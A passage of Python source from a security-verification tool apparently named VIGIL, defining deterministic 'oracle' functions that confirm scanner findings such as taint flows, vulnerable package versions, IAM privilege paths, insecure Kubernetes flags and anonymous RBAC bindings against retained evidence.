            if isinstance(node, (ast.Assign, ast.AnnAssign)) and node.value is not None \
                    and _is_taint_source(node.value):
                for nm in _assign_targets(node):
                    tainted.add(nm)

        def _arg_is_tainted(arg: Any) -> bool:
            if _is_taint_source(arg):
                return True
            for n in ast.walk(arg) if isinstance(arg, ast.AST) else []:
                if isinstance(n, ast.Name) and n.id in tainted:
                    return True
            return False

        for node in ast.walk(fn):
            if not isinstance(node, ast.Call):
                continue
            short = _attr_or_name(node.func)
            if short not in _TAINT_SINK_FNS:
                continue
            # subprocess.call/run/Popen/check_output are only command-injection-shaped with shell=True.
            if short in ("call", "run", "Popen", "check_output") and not _shell_true(node):
                continue
            for arg in node.args:
                if _arg_is_tainted(arg):
                    return True, (f"a taint source reaches the dangerous sink `{short}(...)` in function "
                                  f"`{fn.name}` with no sanitizer between (direct intra-procedural flow)")
            # a tainted keyword argument (e.g. the command= of Popen) also flows.
            for kw in node.keywords:
                if kw.arg and _arg_is_tainted(kw.value):
                    return True, (f"a taint source reaches the dangerous sink `{short}(...)` (keyword "
                                  f"`{kw.arg}`) in function `{fn.name}` with no sanitizer between")
    return False, ""


# Per-tier calibrated confidence (str -> float, so oracle_version canonicalises it deterministically — a
# dict of FUNCTIONS would repr with process-specific addresses and hide the helper bodies from the version,
# so the tier helpers are dispatched BY NAME inside the oracle instead, and each helper's source is captured
# in the version's transitive closure).
_STATIC_TIER_CONF: dict[str, float] = {
    "broken-crypto-invocation": 0.9,
    "insecure-randomness-sink": 0.85,
    "insecure-flag-literal": 0.9,
    "direct-taint": 0.85,
}


def _static_tier_hit(rule_id: str, tree: ast.AST) -> "tuple[bool, str]":
    """Dispatch a re-parsed AST to the tier helper for ``rule_id`` (each helper referenced BY NAME so its
    source is captured in ``oracle_version``'s transitive closure)."""
    if rule_id == "broken-crypto-invocation":
        return _broken_crypto_hit(tree)
    if rule_id == "insecure-randomness-sink":
        return _insecure_randomness_hit(tree)
    if rule_id == "insecure-flag-literal":
        return _insecure_flag_hit(tree)
    if rule_id == "direct-taint":
        return _direct_taint_hit(tree)
    return False, ""


def static_rule_oracle(observed: Any) -> OracleSignal:
    """Fire when a CLOSED-vocabulary static rule holds over RETAINED SOURCE-CODE BYTES that the oracle
    RE-PARSES ITSELF (Python `ast`). The tool (semgrep/joern/pattern) output is only the LEAD saying WHERE to
    look — this oracle re-derives the CODE PROPERTY from the retained bytes, exactly like
    ``weak_crypto_artifact_oracle`` re-derives a broken hash from a retained artifact. Each FACT is honestly
    scoped to the proven CODE PROPERTY, NEVER runtime exploitability.

    ``observed`` is JSON-safe evidence::

        {"rule_id": "broken-crypto-invocation" | "insecure-randomness-sink" |
                    "insecure-flag-literal" | "direct-taint",
         "source": "<the retained source region bytes>", "language": "python",
         "path": "<file>", "line": <int>}

    REFUSES (non-firing) — never asserts — when: the evidence is malformed, the rule_id is out of the closed
    vocabulary, the language is not Python, or the retained source cannot be re-parsed (a tamper that removes
    the property no longer re-fires, so the retained proof is rejected at re-verify). Pure + deterministic, so
    the same verdict re-verifies offline from the retained context. Never raises."""
    if not isinstance(observed, Mapping):
        return OracleSignal(kind=OracleKind.STATIC_RULE, fired=False, confidence=0.0,
                            evidence="no static-rule evidence")
    rule_id = _coerce_text(observed.get("rule_id")).strip()
    source = _coerce_text(observed.get("source"))
    language = _coerce_text(observed.get("language")).strip().lower() or "python"
    path = _coerce_text(observed.get("path")).strip()
    try:
        line = int(observed.get("line"))
    except (TypeError, ValueError):
        line = 0
    where = f"{path}:{line}" if path else "the retained region"

    if rule_id not in _STATIC_RULE_IDS:
        return OracleSignal(kind=OracleKind.STATIC_RULE, fired=False, confidence=0.0,
                            evidence=f"rule_id {rule_id!r} is out of the closed static-rule vocabulary")
    if language not in ("python", "py"):
        # A sound offline re-parse is implemented for Python only; other languages REFUSE (a lead), never assert.
        return OracleSignal(
            kind=OracleKind.STATIC_RULE, fired=False, confidence=0.0,
            evidence=f"language {language!r} is not re-parseable by this oracle (Python-only) — REFUSE (lead)",
            observed={"rule_id": rule_id, "language": language, "reason": "unsupported_language"})
    if not source.strip():
        return OracleSignal(kind=OracleKind.STATIC_RULE, fired=False, confidence=0.0,
                            evidence="no retained source bytes to re-parse — REFUSE (lead)")
    try:
        tree = ast.parse(source)
    except (SyntaxError, ValueError):
        # The retained source cannot be re-parsed (tampered / truncated / not a full statement) — REFUSE.
        return OracleSignal(
            kind=OracleKind.STATIC_RULE, fired=False, confidence=0.0,
            evidence=f"retained source at {where} cannot be re-parsed as Python — REFUSE (never mint)",
            observed={"rule_id": rule_id, "reason": "unparseable"})

    confidence = _STATIC_TIER_CONF[rule_id]
    fired, detail = _static_tier_hit(rule_id, tree)
    if fired:
        return OracleSignal(
            kind=OracleKind.STATIC_RULE, fired=True, confidence=confidence,
            evidence=(f"static rule {rule_id} holds at {where}: {detail} — a re-verifiable CODE PROPERTY over "
                      f"the retained source, NOT proof of runtime exploitability"),
            observed={"rule_id": rule_id, "path": path, "line": line, "detail": detail, "language": "python"})
    return OracleSignal(
        kind=OracleKind.STATIC_RULE, fired=False, confidence=0.0,
        evidence=f"static rule {rule_id} does NOT hold over the retained source at {where}",
        observed={"rule_id": rule_id, "path": path, "line": line})


# ---------------------------------------------------------------------------
# Version range — a package version provably falls in an advisory's affected range
# ---------------------------------------------------------------------------


def version_range_oracle(observed_advisory: Any) -> OracleSignal:
    """Fire when a package's CONCRETE version PROVABLY falls inside a vulnerability advisory's affected
    version range — the deterministic membership check that promotes a scanner's "package X @ V is
    affected by CVE-Y" OBSERVATION into a FACT. A grype/osv/trivy match alone is a LEAD; this oracle
    re-derives the verdict from the retained ``{version, affected}`` evidence, so a scanner's say-so
    never becomes a fact and a mangled range never fabricates one.

    ``observed_advisory`` is JSON-safe evidence::

        {"package": str, "version": str, "vuln_id": str?, "ecosystem": str?,
         "affected": [ {"introduced": "2.0", "fixed": "2.15.0"} | ">=1.0.0,<2.0.0" , ... ]}

    Fires at 0.95 only when ``version_in_affected(version, affected)`` proves membership. Does NOT fire
    when the version is outside the range, the version/range is unparseable, or ``affected`` is empty —
    an absent or negative proof is never an assumed pass (FAIL-CLOSED). Pure and deterministic, so the
    same verdict re-verifies offline from the retained context."""
    from .version import version_in_affected

    if not isinstance(observed_advisory, Mapping):
        return OracleSignal(kind=OracleKind.VERSION_RANGE, fired=False, confidence=0.0,
                            evidence="no advisory evidence")
    adv = observed_advisory
    package = _coerce_text(adv.get("package")).strip()
    version = _coerce_text(adv.get("version")).strip()
    vuln_id = _coerce_text(adv.get("vuln_id")).strip()
    affected = adv.get("affected")

    if not version or affected is None or (isinstance(affected, (list, tuple)) and not affected):
        return OracleSignal(
            kind=OracleKind.VERSION_RANGE, fired=False, confidence=0.0,
            evidence="no concrete version or affected-range to adjudicate",
            observed={"package": package, "version": version, "vuln_id": vuln_id})

    if version_in_affected(version, affected):
        return OracleSignal(
            kind=OracleKind.VERSION_RANGE, fired=True, confidence=0.95,
            evidence=f"{package or 'package'} {version} is in the affected range of {vuln_id or 'the advisory'}",
            observed={"package": package, "version": version, "vuln_id": vuln_id, "reason": "in_range"})
    return OracleSignal(
        kind=OracleKind.VERSION_RANGE, fired=False, confidence=0.0,
        evidence=f"{package or 'package'} {version} is NOT provably in {vuln_id or 'the advisory'}'s affected range",
        observed={"package": package, "version": version, "vuln_id": vuln_id})


# ---------------------------------------------------------------------------
# Policy path — a real IAM grant path lets a principal reach a resource (privesc)
# ---------------------------------------------------------------------------

# Access lattice (a granted level >= the requested level authorises the request). Unknown non-empty
# access tokens are treated as read-tier (2) — a named-but-unrecognised action is not assumed to be
# admin. An UNSPECIFIED (empty) granted access is treated as the MINIMUM (1): a grant statement that
# names no action cannot, by itself, prove a specific write/admin request — it only proves bare
# reachability (a request for access "" — "any path at all"). Conservative by construction.
_ACCESS_LEVEL: dict[str, int] = {
    "list": 1, "read": 2, "get": 2, "describe": 2, "readonly": 2, "read_only": 2, "view": 2,
    "write": 3, "put": 3, "modify": 3, "update": 3, "delete": 3, "create": 3,
    "read_write": 3, "readwrite": 3,
    "admin": 4, "owner": 4, "full": 4, "root": 4, "all": 4, "*": 4, "manage": 4,
}


def _access_level(access: Any) -> int:
    """The lattice level of an access token. Empty/None -> 1 (minimum); an unrecognised non-empty
    token -> 2 (read-tier, never assumed admin); a known token -> its level."""
    a = str(access or "").strip().lower().replace("-", "_")
    if not a:
        return 1
    return _ACCESS_LEVEL.get(a, 2)


def _access_grants(granted: Any, requested: Any) -> bool:
    """True iff a grant of ``granted`` access authorises a request for ``requested`` access. An empty
    request ("any access path") is satisfied by any grant; otherwise the granted level must dominate."""
    if not str(requested or "").strip():
        return True
    return _access_level(granted) >= _access_level(requested)


def _norm_id(value: Any) -> str:
    """Canonical (lowercased, stripped) node key — matches ``intel.from_cloud``'s key normalisation so
    the retained graph and the query agree on identity."""
    return str(value or "").strip().lower()


def policy_path_oracle(observed_policy: Any) -> OracleSignal:
    """Fire when a REAL IAM policy PATH lets a principal reach a resource — the privilege-path half of
    prove-don't-guess for cloud posture. A cloud sensor's "principal X is over-privileged / can reach
    sensitive resource R" is a heuristic LEAD; this oracle does NOT trust that judgement — it
    RE-DERIVES, over the RETAINED raw policy graph, a concrete grant path and fires only if one exists.
    The path (the ordered assume/member hops plus the granting statement) IS the evidence, so the
    verdict re-verifies OFFLINE from the certificate exactly like every other oracle: pure graph search,
    deterministic, no clock/rng, re-runnable by anyone with no cloud and no trust in the sensor.

    ``observed_policy`` is the JSON-safe retained policy graph + the reachability query it is judged on::

        {"principal": "role/dev", "resource": "s3/customer-data", "access": "read"?,
         "grants":    [{"principal": "role/admin", "resource": "s3/customer-data", "access": "read"}],
         "assume":    [{"src": "role/dev",  "dst": "role/admin"}],   # src CAN_ASSUME dst -> inherits its grants
         "member_of": [{"src": "role/dev",  "dst": "group/eng"}]}    # src MEMBER_OF dst -> inherits its grants

    A principal reaches the resource iff SOME principal in its assume/member closure holds a grant over
    the resource whose access dominates the requested access (``access`` omitted / "" means "any grant
    path at all"). No path — or an insufficient access level — does NOT fire (a benign config is not
    confirmed). Matching is exact on canonical (lowercased) ids. GROUNDING is procedural: the graph MUST
    be built from the raw retained export (``verify.policy_path.build_policy_graph``), NEVER laundered
    from the sensor's minted world-model beliefs — that is what keeps this a re-derivation, not a
    rubber-stamp of the sensor's say-so."""
    if not isinstance(observed_policy, Mapping):
        return OracleSignal(kind=OracleKind.POLICY_PATH, fired=False, confidence=0.0,
                            evidence="no policy graph evidence")

    start = _norm_id(observed_policy.get("principal"))
    target = _norm_id(observed_policy.get("resource"))
    requested = str(observed_policy.get("access") or "").strip()
    if not start or not target:
        return OracleSignal(
            kind=OracleKind.POLICY_PATH, fired=False, confidence=0.0,
            evidence="policy query needs both a principal and a resource",
            observed={"principal": start, "resource": target})

    # principal -> principal adjacency (CAN_ASSUME / MEMBER_OF both let the source inherit the dst's
    # grants), and principal -> [(resource, access), ...] grants. Deterministic (sorted) construction.
    adj: dict[str, list[tuple[str, str]]] = {}
    for rel_key, via in (("assume", "can_assume"), ("member_of", "member_of")):
        for e in observed_policy.get(rel_key) or []:
            if not isinstance(e, Mapping):
                continue
            src, dst = _norm_id(e.get("src")), _norm_id(e.get("dst"))
            if src and dst:
                adj.setdefault(src, []).append((dst, via))
    grants: dict[str, list[tuple[str, str]]] = {}
    for g in observed_policy.get("grants") or []:
        if not isinstance(g, Mapping):
            continue
        p, r = _norm_id(g.get("principal")), _norm_id(g.get("resource"))
        if p and r:
            grants.setdefault(p, []).append((r, str(g.get("access") or "")))
    for k in adj:
        adj[k].sort()
    for k in grants:
        grants[k].sort()

    # BFS from the query principal over the assume/member closure, recording the predecessor edge so a
    # firing path can be reconstructed. Deterministic: sorted adjacency, first-found path.
    prev: dict[str, tuple[str, str]] = {}   # node -> (from_node, via)
    order = [start]
    seen = {start}
    hit: tuple[str, str, str] | None = None   # (holder_principal, resource, granted_access)
    i = 0
    while i < len(order):
        cur = order[i]
        i += 1
        for res, acc in grants.get(cur, ()):
            if res == target and _access_grants(acc, requested):
                hit = (cur, res, acc)
                break
        if hit is not None:
            break
        for nxt, via in adj.get(cur, ()):
            if nxt not in seen:
                seen.add(nxt)
                prev[nxt] = (cur, via)
                order.append(nxt)

    if hit is None:
        return OracleSignal(
            kind=OracleKind.POLICY_PATH, fired=False, confidence=0.0,
            evidence=(f"no IAM policy path grants {start!r} "
                      f"{('access '+requested+' ') if requested else ''}to {target!r} "
                      f"(closure of {len(seen)} principal(s) holds no dominating grant)"),
            observed={"principal": start, "resource": target, "access": requested,
                      "reachable_principals": sorted(seen)})

    holder, res, granted = hit
    # reconstruct principal hops start -> ... -> holder
    hops: list[str] = [holder]
    node = holder
    while node != start and node in prev:
        node = prev[node][0]
        hops.append(node)
    hops.reverse()
    path_steps: list[dict[str, str]] = []
    for a, b in zip(hops, hops[1:]):
        via = prev[b][1] if b in prev else "?"
        path_steps.append({"from": a, "via": via, "to": b})
    path_steps.append({"from": holder, "via": "has_grant", "to": res, "access": granted})
    chain = " -> ".join([start] + [f"[{s['via']}] {s['to']}" for s in path_steps])
    return OracleSignal(
        kind=OracleKind.POLICY_PATH,
        fired=True,
        confidence=0.9,
        evidence=(f"IAM policy path grants {start!r} "
                  f"{('access '+requested) if requested else 'access'} to {target!r}: {chain}"),
        observed={"principal": start, "resource": target, "requested_access": requested,
                  "grant_holder": holder, "granted_access": granted, "path": path_steps,
                  "hops": len(path_steps) - 1})


# ---------------------------------------------------------------------------
# K8s posture — a kube-bench CIS control FAILED with a concrete observed insecure setting
# ---------------------------------------------------------------------------
#
# Workstream-3: promote a kube-bench CIS-control-failure LEAD (sensors.k8s_runtime) to a FACT. A
# scanner FAIL is a THIRD-PARTY heuristic say-so; this oracle does NOT trust it — it RE-DERIVES the
# weakness over the RETAINED control evidence: a control is a proven insecure setting only when it hard-
# FAILED (WARN is a manual-review advisory, not a proof) AND its OBSERVED value literally carries a
# dangerous flag (a parse-proof over `actual_value`, mirroring how reflection_context_oracle PARSES to
# prove an executable context rather than substring-matching). A PASSING control never fires (status !=
# FAIL), a FAIL whose observed value shows the SECURE setting never fires (no rule matches), and a FAIL
# with no captured value stays a LEAD (no concrete proof) — near-zero false positives by construction.
#
# Each rule is a (rule_id, compiled regex over the observed flag value, human label). The separator
# `[=:\s]+` matches the kube-bench renderings `--flag=value` / `--flag value` / `--flag: value`. The
# regexes are fixed-alternation and non-backtracking over a LENGTH-CAPPED value (ReDoS-safe), and the
# tuple order is fixed so the verdict is deterministic (same evidence -> same signal, re-runnable
# offline from the certificate exactly like every oracle above).
_K8S_VALUE_CAP = 8192

_INSECURE_SETTING_RULES: tuple[tuple[str, "re.Pattern[str]", str], ...] = (
    ("anonymous_auth_enabled", re.compile(r"(?i)--anonymous-auth[=:\s]+true\b"),
     "--anonymous-auth is enabled (unauthenticated API/kubelet access)"),
    ("authz_mode_always_allow", re.compile(r"(?i)--authorization-mode[=:\s]+\S*alwaysallow"),
     "--authorization-mode includes AlwaysAllow (authorization disabled)"),
    ("insecure_port_open", re.compile(r"(?i)--insecure-port[=:\s]+0*[1-9]\d*"),
     "--insecure-port is a non-zero port (unauthenticated plaintext API)"),
    ("kubelet_read_only_port", re.compile(r"(?i)--read-only-port[=:\s]+0*[1-9]\d*"),
     "kubelet --read-only-port is a non-zero port (unauthenticated read API)"),
    ("basic_auth_file", re.compile(r"(?i)--basic-auth-file[=:\s]+\S+"),
     "--basic-auth-file is set (static-password basic auth)"),
    ("token_auth_file", re.compile(r"(?i)--token-auth-file[=:\s]+\S+"),
     "--token-auth-file is set (static-token auth)"),
    ("etcd_no_client_cert_auth", re.compile(r"(?i)--client-cert-auth[=:\s]+false\b"),
     "etcd --client-cert-auth is false (no client-certificate authentication)"),
    ("profiling_enabled", re.compile(r"(?i)--profiling[=:\s]+true\b"),
     "--profiling is enabled (debug endpoints exposed)"),
)


def k8s_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a kube-bench CIS control PROVABLY carries a concrete insecure setting — the membership/
    parse-proof that promotes ``sensors.k8s_runtime``'s CIS-control-FAILURE LEAD to a FACT. A kube-bench
    FAIL is a third-party CIS-checker's say-so; this oracle re-derives the weakness over the RETAINED
    control so the scanner's verdict is never rubber-stamped and a benign posture is never confirmed.

    ``observed_control`` is the JSON-safe evidence the sensor retained (``sensors.k8s_runtime`` carries
    it in the control lead)::

        {"check_id": "1.2.1", "status": "FAIL", "actual_value": "... --anonymous-auth=true ...",
         "description": str?, "section": str?, "benchmark": "cis-kubernetes"?}

    Fires (0.9) only when ALL hold:
      1. ``status`` is a hard ``FAIL`` — a WARN is a manual-review advisory, not a proof, so it stays a
         LEAD (WARN/PASS/INFO never fire);
      2. the retained ``actual_value`` is present AND one of ``_INSECURE_SETTING_RULES`` matches it — the
         concrete observed value literally carries a dangerous flag (``--anonymous-auth=true``,
         ``--authorization-mode=…AlwaysAllow``, a non-zero ``--insecure-port``, a static auth file, …).

    A PASSING control (``status`` != FAIL), a FAIL whose observed value shows the SECURE setting (no rule
    matches — e.g. ``--anonymous-auth=false``), and a FAIL with no captured value all correctly do NOT
    fire — a control the oracle cannot PROVE insecure stays an honest LEAD. Pure + deterministic, so the
    same verdict re-verifies offline from the retained context. GROUNDING is procedural exactly as for
    every oracle: the control MUST be the sensor's RETAINED kube-bench evidence, never a re-run of the
    tool laundered as a fact."""
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
                            evidence="no kube-bench control evidence")
    ctl = observed_control
    check_id = _coerce_text(ctl.get("check_id")).strip()
    status = _coerce_text(ctl.get("status")).strip().upper()
    actual = _coerce_text(ctl.get("actual_value"))[:_K8S_VALUE_CAP]

    if status != "FAIL":
        return OracleSignal(
            kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
            evidence=(f"control {check_id or '?'} status {status or '?'} is not a hard FAIL — "
                      f"not a proven insecure setting (stays a lead)"),
            observed={"check_id": check_id, "status": status})
    if not actual.strip():
        return OracleSignal(
            kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
            evidence=(f"control {check_id or '?'} FAILED but retained no concrete observed value to "
                      f"adjudicate — stays a lead (no near-zero-FP proof)"),
            observed={"check_id": check_id, "status": status})

    for rule_id, pattern, label in _INSECURE_SETTING_RULES:
        m = pattern.search(actual)
        if m is None:
            continue
        hit = m.group(0).strip()
        start = max(0, m.start() - 16)
        snippet = actual[start:m.end() + 16]
        return OracleSignal(
            kind=OracleKind.K8S_POSTURE, fired=True, confidence=0.9,
            evidence=(f"kube-bench REPORT declares CIS control {check_id or '?'} FAILED, and the report's "
                      f"actual_value carries a concrete insecure setting: {label} (reported {hit!r}): "
                      f"...{snippet}... . SUBJECT = the authenticated kube-bench report, NOT an independent "
                      f"VIGIL observation of the live cluster — the report attests what its scan found on the "
                      f"node it ran against; VIGIL re-derives the setting over the retained report bytes"),
            observed={"check_id": check_id, "status": status, "rule": rule_id, "matched": hit,
                      "subject": "kube_bench_report", "reason": "report_declares_insecure_setting"})

    return OracleSignal(
        kind=OracleKind.K8S_POSTURE, fired=False, confidence=0.0,
        evidence=(f"kube-bench report declares control {check_id or '?'} FAILED but its reported value "
                  f"carries no recognised dangerous flag — not provably a declared insecure setting (lead)"),
        observed={"check_id": check_id, "status": status, "subject": "kube_bench_report"})


# ---------------------------------------------------------------------------
# Kubernetes RBAC posture — the ACHIEVED-STATE sibling of k8s_posture_oracle for a LIVE cluster read
# (sensors.k8s_live). A live RBAC binding does not carry kube_bench's control-plane CLI flags, so this
# oracle promotes a live-read RBAC LEAD to a FACT over the RETAINED binding evidence ALONE (offline, ZERO
# cluster calls) — modelled on cloud_posture_oracle.
#
# It re-derives ONE unambiguous, near-zero-FP CRITICAL fact from the RAW retained binding (not a pre-computed
# boolean the sensor decided): an ANONYMOUS subject (system:anonymous / system:unauthenticated) is bound to a
# genuinely DANGEROUS built-in role (cluster-admin / admin / edit — the write/superuser ClusterRoles). That is
# anonymous WRITE/admin access and no cluster ships it by default. Deliberately NOT fired: the built-in
# ``system:public-info-viewer`` binding to ``system:unauthenticated`` (a read-only health/version binding
# present, and benign, in EVERY cluster) — its role is not dangerous, so it never confirms. Privileged /
# host-network pods are NOT promoted here — they are legitimately used by hardened system components
# (kube-proxy, CNI, CSI) on every cluster, so they are LEADS, not facts. An anonymous binding to a
# non-dangerous/custom role also stays a LEAD (surfaced for review, not asserted).
_K8S_WL_STR_CAP = 4096
_K8S_ANON_SUBJECTS = frozenset({"system:anonymous", "system:unauthenticated"})
# built-in ClusterRoles that grant write/superuser — anonymous access to any of these is a critical fact.
_K8S_DANGEROUS_ROLES = frozenset({"cluster-admin", "admin", "edit"})


_K8S_RBAC_APIGROUP = "rbac.authorization.k8s.io"


def _k8s_norm(value: Any) -> str:
    return _coerce_text(value)[:_K8S_WL_STR_CAP].strip().lower()


def _k8s_subject_is_anon(s: Any) -> bool:
    """A subject is an ANONYMOUS principal when its k8s TYPE matches, not merely its name.

    TYPED subject ``{kind, name, api_group}`` (the declared-manifest reducer, reviewer BLOCK #3): only a
    ``User`` named ``system:anonymous`` or a ``Group`` named ``system:unauthenticated`` — and the RBAC
    apiGroup is REQUIRED (an unapplied manifest that omits it is not API-validated, so it cannot mint a FACT;
    a ServiceAccount, or any other kind, merely NAMED "system:anonymous" is a DIFFERENT principal). Kind, name
    AND apiGroup are compared EXACTLY (case- and whitespace-sensitive, as k8s validates them).

    Legacy STRING subject (a live-read RBAC sensor reads the cluster and emits the reserved name directly, so
    the cluster itself is authority): the bare reserved name IS the anonymous principal.
    """
    if isinstance(s, Mapping):
        # k8s subject kind / name / apiGroup are case- AND whitespace-SENSITIVE — a padded or case-variant
        # value is a DIFFERENT principal (red-pen: a "system:anonymous\n" name, or a "USER"/" User " kind, must
        # NOT match the reserved principal). Compare EXACTLY against the canonical k8s spellings; the RBAC
        # apiGroup is required (an unapplied manifest that omits it is not API-validated).
        if _coerce_text(s.get("api_group") or s.get("apiGroup")) != _K8S_RBAC_APIGROUP:
            return False
        kind = _coerce_text(s.get("kind"))
        name = _coerce_text(s.get("name"))
        return (kind == "User" and name == "system:anonymous") or \
               (kind == "Group" and name == "system:unauthenticated")
    # Legacy STRING subject (a live-read RBAC sensor emits the reserved name directly). Match EXACTLY too — the
    # reserved principals are always lowercase "system:anonymous" / "system:unauthenticated"; a case/whitespace
    # variant ("System:Anonymous", "system:anonymous ") is a DIFFERENT principal and must NOT match (red-pen
    # re-attack: the typed path was made exact but the string path still .strip().lower()'d via _k8s_norm).
    return _coerce_text(s) in _K8S_ANON_SUBJECTS


def _k8s_subject_display(s: Any) -> str:
    """A human name for a subject (typed or string) for the evidence string."""
    if isinstance(s, Mapping):
        return _coerce_text(s.get("name"))[:_K8S_WL_STR_CAP].strip()
    return _coerce_text(s)[:_K8S_WL_STR_CAP].strip()


def k8s_workload_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a retained LIVE RBAC binding PROVABLY grants a DANGEROUS built-in role to an ANONYMOUS
    subject — the parse-proof that promotes a ``sensors.k8s_live`` RBAC LEAD to a FACT over the RETAINED
    binding ALONE (offline, ZERO cluster calls). The oracle re-derives the judgment from the RAW retained
    ``subjects`` list and ``role`` (NOT a boolean the sensor pre-computed), so it is an independent
    membership-proof, not a rubber-stamp.

    ``observed_control`` is the JSON-safe retained control::

        {"check_id": "binding:ns/name"?, "resource_kind": "rolebinding"?, "name": str?,
         "achieved_state": {"subjects": ["system:unauthenticated", "alice", …], "role": "cluster-admin"}}

    Fires (0.9) ONLY when: a subject is ``system:anonymous`` / ``system:unauthenticated`` AND the bound
    ``role`` is a genuinely dangerous built-in role (``cluster-admin`` / ``admin`` / ``edit``). Does NOT fire
    (stays an honest LEAD) for: the benign built-in ``system:public-info-viewer`` binding (its role is not
    dangerous), an anonymous binding to any other/custom role, a binding with no anonymous subject, or
    malformed/absent evidence (non-mapping -> non-fire, never raises). Pure + deterministic — re-verifies
    offline from the retained context. GROUNDING is procedural: the control MUST be the sensor's RETAINED
    binding evidence, never a re-run of a cluster call laundered as a fact."""
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=OracleKind.K8S_WORKLOAD_POSTURE, fired=False, confidence=0.0,
                            evidence="no k8s RBAC control evidence")
    ctl = observed_control
    cid = _coerce_text(ctl.get("check_id") or ctl.get("name"))[:_K8S_WL_STR_CAP].strip()
    label = cid or "?"
    state = ctl.get("achieved_state") if isinstance(ctl.get("achieved_state"), Mapping) else ctl
    raw_subjects = state.get("subjects")
    subjects = raw_subjects if isinstance(raw_subjects, (list, tuple)) else []
    # The roleRef NAME identifies a SPECIFIC RBAC object and is case- AND whitespace-SENSITIVE (k8s validates
    # names with ValidatePathSegmentName; "Cluster-Admin" and "cluster-admin " are DISTINCT objects from the
    # built-in "cluster-admin"). Folding the NAME with _k8s_norm (lower+strip) laundered a benign CUSTOM role
    # onto a dangerous built-in and minted a false "anonymous cluster-admin" FACT (red-pen). Match the built-in
    # role NAME EXACTLY (cap only guards memory; a legit built-in is 13 chars). kind/apiGroup keep their
    # canonical-spelling + empty tolerance (one valid spelling; empty tolerated for hand-authored evidence).
    role_name = _coerce_text(state.get("role"))[:_K8S_WL_STR_CAP]
    role_kind = _k8s_norm(state.get("role_kind"))
    role_apigroup = _k8s_norm(state.get("role_apigroup"))
    anon = [s for s in subjects if _k8s_subject_is_anon(s)]
    # dangerous ONLY when the roleRef is the BUILT-IN ClusterRole in the RBAC apiGroup — a custom namespaced
    # Role merely NAMED "edit"/"admin" (or a case/whitespace variant) is NOT the powerful built-in (an empty
    # kind/apiGroup is tolerated for hand-authored evidence, but a non-ClusterRole kind or non-RBAC apiGroup
    # is rejected).
    dangerous = (role_name in _K8S_DANGEROUS_ROLES
                 and role_kind in ("clusterrole", "")
                 and role_apigroup in ("rbac.authorization.k8s.io", ""))

    if anon and dangerous:
        who = _k8s_subject_display(anon[0])
        return OracleSignal(
            kind=OracleKind.K8S_WORKLOAD_POSTURE, fired=True, confidence=0.9,
            evidence=(f"k8s RBAC fact: binding {label} BINDS the dangerous built-in ClusterRole {role_name!r} "
                      f"to an ANONYMOUS subject {who!r} — this binding grants an unauthenticated principal "
                      f"cluster-wide write/admin (namespace-scoped for a RoleBinding) WHERE IN EFFECT; "
                      f"re-derived over the retained binding. SUBJECT = the binding (the retained RBAC "
                      f"evidence), not proof of the live cluster's runtime state (a declared manifest may not "
                      f"be applied; a live-read binding is present-tense)"),
            observed={"check_id": cid, "rule": "anonymous_privileged_binding",
                      "reason": "anonymous_dangerous_rbac", "role": role_name, "subject": who,
                      "claim_scope": "binding"})

    return OracleSignal(
        kind=OracleKind.K8S_WORKLOAD_POSTURE, fired=False, confidence=0.0,
        evidence=(f"k8s RBAC control {label} does not bind a dangerous built-in ClusterRole to an anonymous "
                  f"subject (role {role_name or '?'!r}; anonymous subjects: {len(anon)}) — not provably "
                  f"critical (stays a lead)"),
        observed={"check_id": cid, "role": role_name})


# ---------------------------------------------------------------------------
# Cloud / CSPM posture — promote a retained cloud-posture LEAD to a FACT over its ACHIEVED STATE
# (Wave-F1). The achieved-state SIBLING of ``k8s_posture_oracle``.
#
# ``sensors.cloud`` mints three posture LEADS (``GROUNDING_INTEL``): ``public_exposure`` and
# ``excessive_privilege`` are already promoted to FACTs by the EXISTING POLICY_PATH oracle
# (``sensors.cloud.confirm_cloud_posture_facts`` re-derives a grant PATH over the whole policy GRAPH). The
# third — ``misconfiguration`` (encryption-at-rest disabled) — is explicitly ``oracle_provable=False``
# there: "no reachability oracle proves it, so it stays an honest LEAD". THIS oracle fills exactly that
# gap: it promotes a retained cloud control to a FACT over the control's ACHIEVED STATE ALONE (a
# single-record membership/parse-proof, NO graph traversal, NO live cloud call) — mirroring how
# ``k8s_posture_oracle`` re-derives a concrete insecure setting over ONE retained kube-bench control
# rather than trusting the scanner's say-so.
#
# A control fires ONLY on an EXPLICIT insecure achieved-state flag a compliant control cannot exhibit;
# the rule tuple order is fixed so the verdict is deterministic (same evidence -> same signal). An
# EXPLICIT compliant/pass status, secure flags (encryption on, not public, no wildcard principal), or
# only ABSENT/unknown flags all correctly do NOT fire — near-zero false positives by construction.
_CLOUD_STR_CAP = 4096
_CLOUD_MAX_PRINCIPALS = 4096

# A CSPM tool's own PASS/compliant verdict is respected: if the retained control records one of these,
# the oracle never fires (a compliant control is not promoted, mirroring how k8s requires a hard FAIL).
_CLOUD_COMPLIANT_STATUSES = frozenset({
    "pass", "passed", "ok", "compliant", "pass_manual", "info", "informational", "not_applicable",
    "na", "n/a", "skipped", "manual",
})
# Principals that denote "anyone" — an anonymous / wildcard grantee is a public-trust achieved state by
# definition (mirrors ``sensors.cloud._ANON_PRINCIPALS`` so the two agree on what "public" means).
_CLOUD_ANON_PRINCIPALS = frozenset({
    "*", "allusers", "anonymous", "public", "everyone", "authenticatedusers", "allauthenticatedusers",
    "principal:*", "arn:aws:iam::*:root", "**",
})

# ---- P4: parse the OWNING account/project of a NAMED cloud principal ---------------------------------
# The cross-account rule (rule 4) compares a named grantee's account to the resource owner's own-account
# set. These patterns extract that account SOUNDLY; anything not matched -> the principal is treated as
# un-attributable and the rule NEVER fires on it (near-zero-FP: an unknown account is never guessed
# cross-account). AWS: a bare 12-digit account principal, or the 12-digit account in an ARN's 5th
# ':'-delimited field (``arn:<partition>:iam::<ACCOUNT>:…`` / ``arn:<partition>:sts::<ACCOUNT>:…``). GCP:
# the project id of a ``serviceAccount:name@<PROJECT>.iam.gserviceaccount.com`` member, or the identity
# domain of a ``user:`` / ``group:`` / ``domain:`` member.
_AWS_ACCOUNT_RE = re.compile(r"^\d{12}$")
_GCP_SA_RE = re.compile(
